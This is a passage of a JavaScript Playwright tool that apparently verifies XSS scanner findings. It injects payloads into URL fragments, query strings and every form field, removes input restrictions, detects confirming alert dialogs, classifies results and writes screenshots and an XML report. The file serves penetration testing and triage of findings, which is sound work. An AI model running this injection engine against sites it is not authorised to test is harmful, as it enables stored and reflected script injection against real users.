      const allElements = document.querySelectorAll('*');
      allElements.forEach((el, i) => {
        for (const attr of el.attributes) {
          if (attr.name.startsWith('on')) {
            data.push({
              type: 'event',
              index: i,
              element: el.tagName,
              event: attr.name,
              content: attr.value,
            });
          }
        }
      });
      return data;
    });

    for (const script of scripts) {
      const content = script.content || '';
      const lowerContent = content.toLowerCase();

      const foundSources = [];
      for (const source of DOM_SOURCES) {
        if (lowerContent.includes(source.toLowerCase())) {
          foundSources.push(source);
        }
      }

      const foundSinks = [];
      for (const [category, sinks] of Object.entries(DOM_SINKS)) {
        for (const sink of sinks) {
          if (lowerContent.includes(sink.toLowerCase())) {
            foundSinks.push({ category, sink });
          }
        }
      }

      if (foundSources.length || foundSinks.length) {
        results.scriptAnalysis.push({
          type: script.type,
          src: script.src,
          event: script.event,
          element: script.element,
          sources: foundSources,
          sinks: foundSinks,
          hasPayload: content.includes(marker) || content.includes(payload),
        });
      }

      results.sourcesFound.push(...foundSources);
      results.sinksFound.push(...foundSinks);
    }

    for (const analysis of results.scriptAnalysis) {
      if (analysis.sources.length && analysis.sinks.length) {
        results.taintFlows.push({
          sources: analysis.sources,
          sinks: analysis.sinks,
          hasPayload: analysis.hasPayload,
        });
      }
    }

    results.exploitable = results.taintFlows.some(f => f.hasPayload) ||
                          results.sinksFound.some(s =>
                            ['innerHTML', 'outerHTML', 'document.write', 'eval', 'setTimeout'].includes(s.sink)
                          );

    results.sourcesFound = [...new Set(results.sourcesFound)];
    results.sinksFound = [...new Set(results.sinksFound.map(s => s.sink))];

    log.dom(`Found ${results.sourcesFound.length} sources, ${results.sinksFound.length} sinks, ${results.taintFlows.length} taint flows`);

  } catch (err) {
    log.debug(`DOM analysis error: ${err.message}`);
    results.error = err.message;
  }

  return results;
}

async function injectDomPayload(page, finding, payload, mode, log) {
  const u = new URL(finding.url);
  u.hash = payload;
  const hashUrl = u.toString();

  log.dom(`Trying DOM hash injection: ${hashUrl}`);
  await page.goto(hashUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  await page.waitForTimeout(1000);

  const queryUrl = buildInjectedUrl(finding, payload, mode);
  log.dom(`Trying DOM query injection: ${queryUrl}`);
  await page.goto(queryUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });

  return { hashUrl, queryUrl };
}

// =============================================================================
// STORED XSS VERIFICATION - REFRESHES AND CHECKS DISPLAY LOCATIONS
// =============================================================================

async function verifyStoredXss(page, finding, args, marker, dialogs, log, injectedUrl = null) {
  const urlsToCheck = [];

  urlsToCheck.push(finding.url);

  for (const url of args.verifyUrls) {
    urlsToCheck.push(url);
  }

  if (injectedUrl && !urlsToCheck.includes(injectedUrl)) {
    urlsToCheck.push(injectedUrl);
  }

  const uniqueUrls = [...new Set(urlsToCheck)];

  const visited = [];
  const renderLocations = [];

  log.stored(`Checking ${uniqueUrls.length} location(s) for stored XSS...`);

  for (const url of uniqueUrls) {
    dialogs.length = 0;
    try {
      log.stored(`  -> Checking: ${url}`);

      await page.goto(url, {
        waitUntil: 'domcontentloaded',
        timeout: args.timeoutMs,
      });
      await page.waitForTimeout(1000);

      await page.reload({ waitUntil: 'domcontentloaded', timeout: args.timeoutMs });
      await page.waitForTimeout(args.waitMs);

      await page.evaluate(() => {
        window.scrollTo(0, document.body.scrollHeight);
      });
      await page.waitForTimeout(500);

      visited.push(url);

      const html = await page.content();
      const markerInHtml = html.includes(marker);
      const payloadInHtml = html.includes('XSS_CHK_');

      const contextAnalysis = analyzeHtmlContext(html, '', marker);

      renderLocations.push({
        url,
        markerInHtml,
        payloadInHtml,
        context: contextAnalysis.contexts,
        exploitable: contextAnalysis.exploitable,
        encoded: contextAnalysis.encoded,
      });

      log.stored(`    Marker found: ${markerInHtml ? 'YES' : 'NO'}, Exploitable: ${contextAnalysis.exploitable ? 'YES' : 'NO'}`);

      const proof = await checkProof(page, marker, dialogs);
      if (proof.confirmed) {
        log.tp(`  [OK] Stored XSS confirmed at: ${url}`);
        return {
          confirmed: true,
          proof,
          verificationUrl: url,
          visited,
          renderLocations,
        };
      }
    } catch (err) {
      visited.push(`${url} ERROR: ${err.message}`);
      log.warn(`Stored verify error at ${url}: ${err.message}`);
    }
  }

  return {
    confirmed: false,
    proof: null,
    verificationUrl: null,
    visited,
    renderLocations,
  };
}

// =============================================================================
// SCREENSHOT WITH ALERT HEADER OVERLAY
// =============================================================================

async function addScreenshotHeader(page, status, finding, payloadIndex, marker, proof) {
  let headerColor, statusText, statusIcon;

  switch(status) {
    case 'CONFIRMED':
      headerColor = '#00C853';
      statusText = 'XSS CONFIRMED';
      statusIcon = '[OK]';
      break;
    case 'FALSE_POSITIVE':
      headerColor = '#FF1744';
      statusText = 'FALSE POSITIVE';
      statusIcon = '[FP]';
      break;
    case 'MANUAL_REVIEW':
      headerColor = '#FF9800';
      statusText = 'MANUAL REVIEW NEEDED';
      statusIcon = '[MR]';
      break;
    case 'STORED_NOT_FOUND':
      headerColor = '#FFC107';
      statusText = 'STORED NOT FOUND';
      statusIcon = '[SN]';
      break;
    case 'ERROR':
      headerColor = '#9E9E9E';
      statusText = 'ERROR';
      statusIcon = '[ER]';
      break;
    default:
      headerColor = '#FFC107';
      statusText = 'INCONCLUSIVE';
      statusIcon = '[?]';
  }

  const dialogInfo = proof?.matchingDialogs?.length
    ? proof.matchingDialogs.map(d => `${d.type}: "${d.message}"`).join(' | ')
    : 'No dialogs captured';

  const overlayHtml = `
    <div id="xss-screenshot-header" style="
      position: fixed;
      top: 0; left: 0; right: 0;
      background: ${headerColor};
      color: white;
      font-family: 'Segoe UI', system-ui, sans-serif;
      font-size: 14px;
      padding: 12px 20px;
      z-index: 999999;
      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
      display: flex;
      justify-content: space-between;
      align-items: center;
    ">
      <div style="font-weight: bold; font-size: 16px;">${statusIcon} ${statusText}</div>
      <div style="opacity: 0.9; font-size: 12px;">
        Finding #${finding.id} | Payload #${payloadIndex} | Marker: ${marker} | ${dialogInfo}
      </div>
    </div>
    <div id="xss-screenshot-spacer" style="height: 50px;"></div>
  `;

  await page.evaluate((html) => {
    const div = document.createElement('div');
    div.innerHTML = html;
    document.body.insertBefore(div.firstElementChild, document.body.firstChild);
    document.body.insertBefore(div.lastElementChild, document.body.firstChild);
  }, overlayHtml);

  await page.waitForTimeout(200);
}

// =============================================================================
// FORM INJECTION & NAVIGATION HELPERS
// =============================================================================
async function injectIntoForm(page, finding, payload, mode) {
  const selector = `[name="${cssAttrEscape(finding.parameter)}"]`;
  const field = page.locator(selector).first();
  const count = await page.locator(selector).count().catch(() => 0);
  if (!count) throw new Error(`Could not find form field: ${selector}`);

  const value = buildValue(finding, payload, mode);
  const tagName = await field.evaluate((el) => el.tagName.toLowerCase()).catch(() => '');
  const inputType = await field.getAttribute('type').catch(() => '');

  if (tagName === 'select') {
    await field.selectOption(value).catch(async () => {
      await field.evaluate((el, v) => {
        el.value = v;
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
      }, value);
    });
  } else if (String(inputType).toLowerCase() === 'hidden') {
    await field.evaluate((el, v) => {
      el.value = v;
      el.dispatchEvent(new Event('input', { bubbles: true }));
      el.dispatchEvent(new Event('change', { bubbles: true }));
    }, value);
  } else {
    await field.fill(value);
  }

  const submitted = await field.evaluate((el) => {
    const form = el.form || el.closest('form');
    if (!form) return false;
    if (typeof form.requestSubmit === 'function') {
      form.requestSubmit();
    } else {
      form.submit();
    }
    return true;
  }).catch(() => false);

  if (!submitted) {
    await field.press('Enter').catch(() => {});
  }
}

async function waitAfterAction(page, waitMs) {
  try { await page.waitForLoadState('domcontentloaded', { timeout: 5000 }); } catch { /* ignore */ }
  try { await page.waitForLoadState('networkidle', { timeout: 5000 }); } catch { /* ignore */ }
  if (waitMs > 0) await page.waitForTimeout(waitMs);
}

async function checkProof(page, marker, dialogs) {
  const matchingDialogs = dialogs.filter((d) => String(d.message || '').includes(marker));
  let markerInHtml = false;
  try {
    markerInHtml = (await page.content()).includes(marker);
  } catch { /* ignore */ }

  return {
    confirmed: matchingDialogs.length > 0,
    dialogs: [...dialogs],
    matchingDialogs,
    markerInHtml,
    consoleEvidence: false,
  };
}

function endpointName(url) {
  const u = new URL(url);
  let endpoint = u.pathname || '/';
  endpoint = endpoint
    .replace(/^\/+/, '')
    .replace(/\/+$/, '')
    .replace(/[^a-zA-Z0-9_.-]+/g, '_');
  return endpoint || 'root';
}

function screenshotStatus(status) {
  if (status === 'CONFIRMED') return 'CONFIRMED';
  if (status === 'FALSE_POSITIVE') return 'FP';
  if (status === 'MANUAL_REVIEW') return 'REVIEW';
  if (status === 'STORED_NOT_FOUND') return 'STORED';
  return 'ERROR';
}

function screenshotPath(args, finding, payloadIndex, status) {
  const endpoint = endpointName(finding.url);
  const s = screenshotStatus(status);
  const xssType = finding.xssType || 'REFLECTED';
  return path.join(
    args.out,
    `${endpoint}_${xssType}_[${s}]_finding_${finding.id}_payload_${payloadIndex}.png`
  );
}

// =============================================================================
// ALL-INPUTS INJECTION ENGINE
// =============================================================================

/**
 * Test ALL inputs on the page with payloads
 * This is the main new feature - discovers every input, removes restrictions, injects
 */
async function testAllInputs(page, finding, payload, mode, args, log) {
  const inputResults = [];

  // Step 1: Discover all inputs
  log.info('Discovering all injectable inputs on page...');
  const allInputs = await discoverAllInputs(page, log);

  if (allInputs.length === 0) {
    log.warn('No injectable inputs found on page');
    return { inputResults, anySuccess: false };
  }

  // Step 2: Remove all restrictions
  log.info('Removing input restrictions...');
  await removeInputRestrictions(page, log);

  // Step 3: Inject payload into each input
  log.info(`Injecting payload into ${allInputs.length} input(s)...`);
  let anySuccess = false;

  for (const inputInfo of allInputs) {
    const result = await injectIntoInput(page, inputInfo.selector, payload, log);
    inputResults.push({
      input: inputInfo,
      injectionResult: result,
    });
    if (result.success) anySuccess = true;
  }

  // Step 4: Submit the form
  if (anySuccess) {
    log.info('Submitting form after multi-input injection...');
    await submitFormAfterInjection(page, log);
    await waitAfterAction(page, args.waitMs);
  }

  return { inputResults, anySuccess };
}

// =============================================================================
// MAIN TESTING ENGINE
// =============================================================================
async function runFinding(browser, finding, args, log) {
  const marker = makeMarker();
  const payloads = loadPayloads(args.payloads, marker, args.maxPayloads);

  const contextOptions = {
    ignoreHTTPSErrors: true,
    viewport: { width: 1366, height: 900 },
    extraHTTPHeaders: browserHeaders(finding.headers),
  };

  if (finding.headers['user-agent']) {
    contextOptions.userAgent = finding.headers['user-agent'].value;
  }
  if (args.proxy) {
    contextOptions.proxy = { server: args.proxy };
  }

  const context = await browser.newContext(contextOptions);

  const manualCookie = getManualCookie(args);
  const burpCookie = getBurpCookie(finding.originalRequest);
  const cookieHeader = manualCookie || burpCookie;

  if (manualCookie) log.info('Using manual cookie');
  else if (burpCookie) log.info('Using cookie from Burp XML');
  else log.warn('No cookie available');

  await addCookies(context, cookieHeader, finding.url, log);

  const page = await context.newPage();
  page.setDefaultTimeout(args.timeoutMs);
  page.setDefaultNavigationTimeout(args.timeoutMs);

  const consoleLogs = [];
  page.on('console', (msg) => {
    consoleLogs.push({ type: msg.type(), text: msg.text() });
    if (msg.text().includes(marker)) {
      log.debug(`Console message with marker: ${msg.text()}`);
    }
  });

  const dialogs = [];
  page.on('dialog', async (dialog) => {
    const message = dialog.message();
    log.info(`Dialog captured: ${dialog.type()} - ${message}`);
    dialogs.push({
      type: dialog.type(),
      message: message,
      timestamp: Date.now(),
    });
    await dialog.accept().catch(() => {});
  });

  const pageErrors = [];
  page.on('pageerror', (err) => {
    pageErrors.push(err.message);
  });

  const attempts = [];

  log.info(`\n${'='.repeat(60)}`);
  log.info(`Testing finding ${finding.id}: ${finding.method} ${finding.url}`);
  log.info(`Type: ${finding.xssType} | Parameter: ${finding.parameter}`);
  if (args.allInputs) log.info('MODE: ALL INPUTS - Will test every field on the page');
  log.info(`${'='.repeat(60)}`);

  for (let i = 0; i < payloads.length; i++) {
    const payload = payloads[i];
    dialogs.length = 0;
    consoleLogs.length = 0;
    pageErrors.length = 0;

    const attempt = {
      index: i + 1,
      payload,
      status: 'PENDING',
      statusReason: '',
      screenshot: null,
      finalUrl: null,
      error: null,
      proof: null,
      verificationUrl: null,
      visitedVerificationUrls: [],
      renderLocations: [],
      domAnalysis: null,
      contextAnalysis: null,
      request: null,
      response: null,
      allInputsTested: null,
      inputInjections: [],
    };

    let httpCapture = null;

    try {
      const u = new URL(finding.url);
      const hasQueryParam = u.searchParams.has(finding.parameter);

      httpCapture = new HttpCapture(page, log, finding, payload);

      // =======================================================================
      // INJECTION LOGIC BASED ON XSS TYPE AND MODE
      // =======================================================================

      if (finding.xssType === 'DOM') {
        log.dom(`\nPayload ${i + 1}/${payloads.length}: DOM-based injection`);
        await injectDomPayload(page, finding, payload, args.mode, log);

        if (args.domDeep) {
          attempt.domAnalysis = await analyzeDomXss(page, finding, payload, marker, log);
        }

        await waitAfterAction(page, args.waitMs);

      } else if (finding.xssType === 'STORED') {
        log.stored(`\n${'-'.repeat(50)}`);
        log.stored(`Payload ${i + 1}/${payloads.length}: STORED XSS injection`);
        log.stored(`Parameter: ${finding.parameter}`);
        log.stored(`Payload: ${payload.substring(0, 100)}${payload.length > 100 ? '...' : ''}`);

        let injectedUrl = null;

        if (finding.method === 'GET' && hasQueryParam) {
          injectedUrl = buildInjectedUrl(finding, payload, args.mode);
          log.stored(`GET injection URL: ${injectedUrl}`);
          await page.goto(injectedUrl, {
            waitUntil: 'domcontentloaded',
            timeout: args.timeoutMs,
          });
        } else {
          log.stored(`Navigating to form page: ${finding.url}`);
          await page.goto(finding.url, {
            waitUntil: 'domcontentloaded',
            timeout: args.timeoutMs,
          });
          await waitAfterAction(page, 500);

          // If --all-inputs mode, test ALL fields
          if (args.allInputs) {
            const allInputResult = await testAllInputs(page, finding, payload, args.mode, args, log);
            attempt.allInputsTested = true;
            attempt.inputInjections = allInputResult.inputResults;
          } else {
            log.stored(`Injecting into form field: ${finding.parameter}`);
            await injectIntoForm(page, finding, payload, args.mode);
          }
        }

        await waitAfterAction(page, args.waitMs);

        log.stored(`Waiting ${args.waitMs}ms for injection to be stored...`);
        await page.waitForTimeout(args.waitMs);

        log.stored(`Verifying stored XSS...`);
        const storedResult = await verifyStoredXss(page, finding, args, marker, dialogs, log, injectedUrl);

        attempt.visitedVerificationUrls = storedResult.visited;
        attempt.verificationUrl = storedResult.verificationUrl;
        attempt.renderLocations = storedResult.renderLocations;

        if (storedResult.confirmed) {
          attempt.status = 'CONFIRMED';
          attempt.statusReason = 'Stored XSS confirmed - dialog fired on display page';
          attempt.proof = storedResult.proof;
          attempt.finalUrl = storedResult.verificationUrl;
          log.tp(`[OK] Stored XSS CONFIRMED with payload ${i + 1}!`);
        } else {
          attempt.status = 'STORED_NOT_FOUND';
          attempt.statusReason = 'Stored payload submitted but not found in any display location';
          log.storedNotFound(`Stored XSS not confirmed with this payload`);
        }

        log.stored(`${'-'.repeat(50)}\n`);

      } else {
        // Reflected XSS
        log.info(`\nPayload ${i + 1}/${payloads.length}: Reflected XSS injection`);

        if (args.allInputs && finding.method !== 'GET') {
          // ALL INPUTS MODE for POST/reflected
          log.info('ALL INPUTS mode enabled for reflected XSS');
          await page.goto(finding.url, {
            waitUntil: 'domcontentloaded',
            timeout: args.timeoutMs,
          });
          await waitAfterAction(page, 500);

          const allInputResult = await testAllInputs(page, finding, payload, args.mode, args, log);
          attempt.allInputsTested = true;
          attempt.inputInjections = allInputResult.inputResults;

        } else if (finding.method === 'GET' && hasQueryParam) {
          const injectedUrl = buildInjectedUrl(finding, payload, args.mode);
          log.info(`GET injection URL: ${injectedUrl.substring(0, 150)}...`);
          await page.goto(injectedUrl, {
            waitUntil: 'domcontentloaded',
            timeout: args.timeoutMs,
          });
        } else {
          log.info(`POST form injection into field: ${finding.parameter}`);
          await page.goto(finding.url, {
            waitUntil: 'domcontentloaded',
            timeout: args.timeoutMs,
          });
          await waitAfterAction(page, 500);

          if (args.allInputs) {
            const allInputResult = await testAllInputs(page, finding, payload, args.mode, args, log);
            attempt.allInputsTested = true;
            attempt.inputInjections = allInputResult.inputResults;
          } else {
            await injectIntoForm(page, finding, payload, args.mode);
          }
        }

        await waitAfterAction(page, args.waitMs);
      }

      // =======================================================================
      // PROOF CHECKING & STATUS DETERMINATION
      // =======================================================================

      let proof = await checkProof(page, marker, dialogs);
      const pageHtml = await page.content().catch(() => '');
      const contextAnalysis = analyzeHtmlContext(pageHtml, payload, marker);
      attempt.contextAnalysis = contextAnalysis;

      // Capture HTTP data if enabled
      if (args.saveHttp) {
        const capturedReq = httpCapture.getRequest();
        const capturedRes = httpCapture.getResponse();

        if (capturedReq) {
          attempt.request = {
            url: capturedReq.url,
            method: capturedReq.method,
            headers: JSON.stringify(capturedReq.headers, null, 2),
            body: capturedReq.postData || '',
          };
        }

        if (capturedRes) {
          attempt.response = {
            statusCode: capturedRes.statusCode,
            headers: JSON.stringify(capturedRes.headers, null, 2),
            body: capturedRes.body || '',
          };
        }
      }

      // Determine status based on proof and context
      if (proof.confirmed) {
        if (!contextAnalysis.exploitable && args.strictFp) {
          attempt.status = 'FALSE_POSITIVE';
          attempt.statusReason = `Dialog fired but payload in non-executable context: ${contextAnalysis.contexts.join(', ')}`;
          log.fp(`Dialog fired but non-executable context - False Positive`);
        } else {
          attempt.status = 'CONFIRMED';
          attempt.statusReason = 'Dialog fired with marker payload - XSS confirmed';
          log.tp(`[OK] XSS CONFIRMED! Dialog fired with marker.`);
        }
        attempt.proof = proof;
        attempt.finalUrl = page.url();

      } else {
        if (contextAnalysis.found) {
          if (contextAnalysis.encoded) {
            attempt.status = 'FALSE_POSITIVE';
            attempt.statusReason = 'Payload HTML-encoded in response - cannot execute';
            log.fp(`[FP] Payload HTML-encoded - False Positive`);

          } else if (!contextAnalysis.exploitable) {
            attempt.status = 'FALSE_POSITIVE';
            attempt.statusReason = `Payload in non-executable context: ${contextAnalysis.contexts.join(', ')}`;
            log.fp(`[FP] Payload in non-executable context - False Positive`);

          } else {
            // CRITICAL: Payload in executable context but no dialog
            attempt.status = 'MANUAL_REVIEW';
            attempt.statusReason = `[MR] Payload in executable context (${contextAnalysis.contexts.join(', ')}) but NO dialog! Check screenshot for CSP, XSS filter, or malformed payload.`;
            attempt.proof = proof;
            attempt.finalUrl = page.url();

            log.manual(`\n${'[MR]'.repeat(15)}`);
            log.manual(`MANUAL REVIEW NEEDED`);
            log.manual(`Payload was FOUND in EXPLOITABLE context: ${contextAnalysis.contexts.join(', ')}`);
            log.manual(`But NO alert() dialog fired with marker: ${marker}`);
            log.manual(``);
            log.manual(`Possible reasons:`);
            log.manual(`  1. Content Security Policy (CSP) blocking inline scripts`);
            log.manual(`  2. XSS filter / WAF modifying the payload`);
            log.manual(`  3. Payload syntax issue - needs different vector`);
            log.manual(`  4. Dialog was blocked by browser settings`);
            log.manual(`  5. The payload executed but alert() was intercepted`);
            log.manual(``);
            log.manual(`-> Check screenshot: ${attempt.screenshot}`);
            log.manual(`-> Review response headers for CSP`);
            log.manual(`${'[MR]'.repeat(15)}\n`);
          }
        } else {
          if (finding.xssType !== 'STORED') {
            attempt.status = 'FALSE_POSITIVE';
            attempt.statusReason = 'Payload not found anywhere in response HTML';
            log.fp(`[FP] Payload not reflected - False Positive`);
          } else if (attempt.status !== 'STORED_NOT_FOUND') {
            attempt.status = 'FALSE_POSITIVE';
            attempt.statusReason = 'Payload not found in response HTML';
          }
        }
      }

      // Double-check DOM XSS (sometimes delayed execution)
      if (finding.xssType === 'DOM' && attempt.status !== 'CONFIRMED') {
        await page.waitForTimeout(2000);
        proof = await checkProof(page, marker, dialogs);
        if (proof.confirmed) {
          attempt.status = 'CONFIRMED';
          attempt.statusReason = 'DOM-based XSS confirmed (delayed execution)';
          attempt.proof = proof;
          attempt.finalUrl = page.url();
          log.tp(`[OK] DOM XSS CONFIRMED! (delayed execution)`);
        }
      }

      // =======================================================================
      // SCREENSHOT CAPTURE
      // =======================================================================
      const shouldScreenshot = true;

      if (shouldScreenshot) {
        await addScreenshotHeader(page, attempt.status, finding, attempt.index, marker, attempt.proof);
        attempt.screenshot = screenshotPath(args, finding, attempt.index, attempt.status);
        await page.screenshot({ path: attempt.screenshot, fullPage: true });

        if (attempt.status === 'CONFIRMED') {
          log.tp(`[SS] Screenshot saved: ${attempt.screenshot}`);
        } else if (attempt.status === 'MANUAL_REVIEW') {
          log.manual(`[SS] Screenshot saved for manual review: ${attempt.screenshot}`);
        } else if (attempt.status === 'FALSE_POSITIVE') {
          log.fp(`[SS] Screenshot saved: ${attempt.screenshot}`);
        }
      }

    } catch (err) {
      attempt.status = 'ERROR';
      attempt.statusReason = err.message || String(err);
      attempt.error = err.message || String(err);
      attempt.finalUrl = page.url();

      attempt.screenshot = screenshotPath(args, finding, attempt.index, 'ERROR');
      try {
        await addScreenshotHeader(page, 'ERROR', finding, attempt.index, marker, null);
        await page.screenshot({ path: attempt.screenshot, fullPage: true });
      } catch { /* ignore */ }

      log.warn(`Payload ${i + 1} error: ${attempt.error}`);
    }

    attempts.push(attempt);

    if (attempt.status === 'CONFIRMED') {
      log.tp(`\n[OK] Stopping further payloads - XSS confirmed!\n`);
      break;
    }
  }

  await context.close();

  // Determine finding classification
  const hasConfirmed = attempts.some((a) => a.status === 'CONFIRMED');
  const hasManualReview = attempts.some((a) => a.status === 'MANUAL_REVIEW');
  const hasStoredNotFound = attempts.some((a) => a.status === 'STORED_NOT_FOUND');
  const hasError = attempts.some((a) => a.status === 'ERROR');
  const allFalsePositive = attempts.every((a) => a.status === 'FALSE_POSITIVE');

  let classification = 'FALSE_POSITIVE';
  let classificationReason = '';

  if (hasConfirmed) {
    classification = 'TRUE_POSITIVE';
    classificationReason = 'XSS confirmed with dialog execution';
  } else if (hasManualReview) {
    classification = 'MANUAL_REVIEW_REQUIRED';
    classificationReason = 'Payload in executable context but no dialog - manual review needed. Check CSP headers and screenshot.';
  } else if (hasStoredNotFound) {
    classification = 'STORED_XSS_UNCLEAR';
    classificationReason = 'Stored payload submitted but not found in display locations - verify manually';
  } else if (hasError) {
    classification = 'TECHNICAL_ERROR';
    classificationReason = 'Errors occurred during testing';
  } else if (allFalsePositive) {
    classification = 'FALSE_POSITIVE';
    classificationReason = 'No evidence of XSS execution';
  }

  return {
    finding: {
      id: finding.id,
      name: finding.name,
      severity: finding.severity,
      confidence: finding.confidence,
      location: finding.location,
      method: finding.method,
      url: finding.url,
      parameter: finding.parameter,
      xssType: finding.xssType,
    },
    marker,
    classification,
    classificationReason,
    attempts,
  };
}

// =============================================================================
// XML REPORT GENERATION
// =============================================================================
function xmlText(value) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function xmlAttr(value) {
  return xmlText(value)
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;');
}

function cdata(value) {
  return `<![CDATA[${String(value ?? '').replace(/\]\]>/g, ']]]]><![CDATA[>')}]]>`;
}

function elem(lines, indent, name, value, useCdata = false) {
  const pad = ' '.repeat(indent);
  if (value === undefined || value === null) {
    lines.push(`${pad}<${name}/>`);
    return;
  }
  const body = useCdata ? cdata(value) : xmlText(value);
  lines.push(`${pad}<${name}>${body}</${name}>`);
}

function formatHeadersForXml(headers) {
  if (!headers) return '';
  if (typeof headers === 'string') return headers;
  try {
    const parsed = typeof headers === 'string' ? JSON.parse(headers) : headers;
    let result = '';
    for (const [key, value] of Object.entries(parsed)) {
      result += `${key}: ${value}
`;
    }
    return result;
  } catch {
    return String(headers);
  }
}

function generateXml(report) {
  const lines = [];
  lines.push('<?xml version="1.0" encoding="UTF-8"?>');
  lines.push(`<xssPlaywrightReport generatedAt="${xmlAttr(report.generatedAt)}" version="8.0" hasRealHttpData="${report.hasRealHttpData}">`);

  lines.push('  <summary>');
  elem(lines, 4, 'totalFindings', report.summary.totalFindings);
  elem(lines, 4, 'truePositives', report.summary.truePositives);
  elem(lines, 4, 'falsePositives', report.summary.falsePositives);
  elem(lines, 4, 'manualReviewRequired', report.summary.manualReviewRequired);
  elem(lines, 4, 'storedXssUnclear', report.summary.storedXssUnclear);
  elem(lines, 4, 'technicalErrors', report.summary.technicalErrors);
  elem(lines, 4, 'truePositiveRatePercent', report.summary.truePositiveRatePercent);
  lines.push('  </summary>');

  lines.push('  <findings>');

  for (const result of report.results) {
    const f = result.finding;
    lines.push(`    <finding id="${xmlAttr(f.id)}" xssType="${xmlAttr(f.xssType)}">`);
    elem(lines, 6, 'name', f.name, true);
    elem(lines, 6, 'severity', f.severity);
    elem(lines, 6, 'confidence', f.confidence);
    elem(lines, 6, 'location', f.location, true);
    elem(lines, 6, 'method', f.method);
    elem(lines, 6, 'url', f.url, true);
    elem(lines, 6, 'parameter', f.parameter);
    elem(lines, 6, 'marker', result.marker);
    elem(lines, 6, 'classification', result.classification);
    elem(lines, 6, 'classificationReason', result.classificationReason, true);

    lines.push('      <attempts>');

    for (const attempt of result.attempts) {
      lines.push(`        <attempt index="${xmlAttr(attempt.index)}" status="${xmlAttr(attempt.status)}">`);
      elem(lines, 10, 'statusReason', attempt.statusReason, true);
      elem(lines, 10, 'payload', attempt.payload, true);
      elem(lines, 10, 'screenshot', attempt.screenshot, true);
      elem(lines, 10, 'finalUrl', attempt.finalUrl, true);
      elem(lines, 10, 'verificationUrl', attempt.verificationUrl, true);

      if (attempt.error) {
        elem(lines, 10, 'error', attempt.error, true);
      }

      if (attempt.request) {
        lines.push('          <request>');
        elem(lines, 12, 'url', attempt.request.url, true);
        elem(lines, 12, 'method', attempt.request.method);
        elem(lines, 12, 'headers', formatHeadersForXml(attempt.request.headers), true);
        elem(lines, 12, 'body', attempt.request.body, true);
        lines.push('          </request>');
      }

      if (attempt.response) {
        lines.push('          <response>');
        elem(lines, 12, 'statusCode', attempt.response.statusCode);
        elem(lines, 12, 'headers', formatHeadersForXml(attempt.response.headers), true);
        elem(lines, 12, 'body', attempt.response.body, true);
        lines.push('          </response>');
      }

      if (attempt.contextAnalysis) {
        lines.push('          <contextAnalysis>');
        elem(lines, 12, 'found', attempt.contextAnalysis.found);
        elem(lines, 12, 'encoded', attempt.contextAnalysis.encoded);
        elem(lines, 12, 'exploitable', attempt.contextAnalysis.exploitable);
        elem(lines, 12, 'assessmentReason', attempt.contextAnalysis.reason, true);
        lines.push('            <contexts>');
        for (const ctx of attempt.contextAnalysis.contexts || []) {
          elem(lines, 14, 'context', ctx);
        }
        lines.push('            </contexts>');
        lines.push('          </contextAnalysis>');
      }

      if (attempt.domAnalysis) {
        lines.push('          <domAnalysis>');
        elem(lines, 12, 'exploitable', attempt.domAnalysis.exploitable);
        lines.push('            <sources>');
        for (const src of attempt.domAnalysis.sourcesFound || []) {
          elem(lines, 14, 'source', src);
        }
        lines.push('            </sources>');
        lines.push('            <sinks>');
        for (const sink of attempt.domAnalysis.sinksFound || []) {
          elem(lines, 14, 'sink', sink);
        }
        lines.push('            </sinks>');
        lines.push('          </domAnalysis>');
      }

      if (attempt.renderLocations && attempt.renderLocations.length) {
        lines.push('          <renderLocations>');
        for (const loc of attempt.renderLocations) {
          lines.push('            <location>');
          elem(lines, 14, 'url', loc.url, true);
          elem(lines, 14, 'markerInHtml', loc.markerInHtml);
          elem(lines, 14, 'payloadInHtml', loc.payloadInHtml);
          elem(lines, 14, 'exploitable', loc.exploitable);
          elem(lines, 14, 'encoded', loc.encoded);
          lines.push('              <contexts>');
          for (const ctx of loc.context || []) {
            elem(lines, 16, 'context', ctx);
          }
          lines.push('              </contexts>');
          lines.push('            </location>');
        }
        lines.push('          </renderLocations>');
      }

      // NEW: All inputs tested info
      if (attempt.allInputsTested) {
        lines.push('          <allInputsTested>true</allInputsTested>');
        lines.push('          <inputInjections>');
        for (const inj of attempt.inputInjections || []) {
          lines.push('            <inputInjection>');
          elem(lines, 14, 'selector', inj.input?.selector, true);
          elem(lines, 14, 'tagName', inj.input?.tagName);
          elem(lines, 14, 'inputType', inj.input?.type);
          elem(lines, 14, 'name', inj.input?.name);
          elem(lines, 14, 'id', inj.input?.id);
          elem(lines, 14, 'success', inj.injectionResult?.success);
          elem(lines, 14, 'error', inj.injectionResult?.error, true);
          if (inj.input?.restrictions) {
            lines.push('              <restrictions>');
            const r = inj.input.restrictions;
            if (r.hasMaxlength) elem(lines, 16, 'maxlength', r.maxlengthValue);
            if (r.hasPattern) elem(lines, 16, 'pattern', r.patternValue);
            if (r.hasReadonly) elem(lines, 16, 'readonly', 'true');
            if (r.hasDisabled) elem(lines, 16, 'disabled', 'true');
            lines.push('              </restrictions>');
          }
          lines.push('            </inputInjection>');
        }
        lines.push('          </inputInjections>');
      }

      lines.push('          <visitedVerificationUrls>');
      for (const url of attempt.visitedVerificationUrls || []) {
        elem(lines, 12, 'url', url, true);
      }
      lines.push('          </visitedVerificationUrls>');

      if (attempt.proof) {
        lines.push('          <proof>');
        elem(lines, 12, 'confirmed', attempt.proof.confirmed);
        elem(lines, 12, 'markerInHtml', attempt.proof.markerInHtml);
        lines.push('            <dialogs>');
        for (const dialog of attempt.proof.dialogs || []) {
          lines.push(`              <dialog type="${xmlAttr(dialog.type)}" timestamp="${xmlAttr(dialog.timestamp || '')}">${cdata(dialog.message)}</dialog>`);
        }
        lines.push('            </dialogs>');
        lines.push('          </proof>');
      }

      lines.push('        </attempt>');
    }

    lines.push('      </attempts>');
    lines.push('    </finding>');
  }

  lines.push('  </findings>');
  lines.push('</xssPlaywrightReport>');
  lines.push('');
  return lines.join('\n');
}

// =============================================================================
// MAIN
// =============================================================================
async function main() {
  const args = parseArgs(process.argv);
  const log = new Logger(args.noColor, args.verbose);

  fs.mkdirSync(args.out, { recursive: true });

